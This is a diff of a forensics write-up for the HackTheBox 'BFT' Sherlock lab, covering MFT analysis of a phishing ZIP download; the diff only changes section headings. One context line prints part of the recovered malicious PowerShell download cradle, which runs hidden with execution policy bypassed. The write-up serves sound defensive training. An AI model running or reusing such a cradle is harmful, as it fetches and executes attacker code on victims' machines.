@@ -10,7 +10,7 @@ author: miniMinn
 platform:
   - HackTheBox
 ---
-# 01.Overview
+# 📓 Overview
 BFT lab is a Sherlock challenge and rated as Very Easy level. It's about Master File Table (MFT) forensic within NTFS filesystem, where a user named Simon Stark was targeted by attackers on Feb 13, downloading a malicious ZIP via email by phishing attack.  
 
 ### Tools used
@@ -18,7 +18,7 @@ BFT lab is a Sherlock challenge and rated as Very Easy level. It's about Master 
 - [ImHex](https://imhex.org/): to analyse memory using Hex editor.
 - [CyberChef](https://gchq.github.io/CyberChef/): to decode hex offsets.
 
-# 02.Initial analysis
+# 💻 Initial analysis
 
 > [!quote]- Sherlock Scenario
 > In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.
@@ -61,7 +61,7 @@ Next, you can run any of these the programs using .NET 9 framework on any Linux 
 dotnet MFTECmd.dll -f "/path/to/$MFT" --csv "/output/path" --csvf "mft_results.csv"
 ```
 
-# 03.Q&A
+# 👨‍💻 Q&A
 
 ## Task 1
 > *Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?*
@@ -161,6 +161,6 @@ start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Pr
 By analyzing the code, we can extract the IP address and port used by the malware for C2 control by the attacker. These details can used for blocking
 further malicious communications to improve the security posture.  
 
-# 04.Lessons learned
+# 💭 Lessons learned
 
 This challenge introduced practical Master File Table (MFT) forensics and demonstrated how valuable NTFS metadata can be during an investigation. Through the analysis, I learned how to parse raw `$MFT` artifacts, build timelines of user activity, and trace malicious events from an initial phishing download to malware execution.
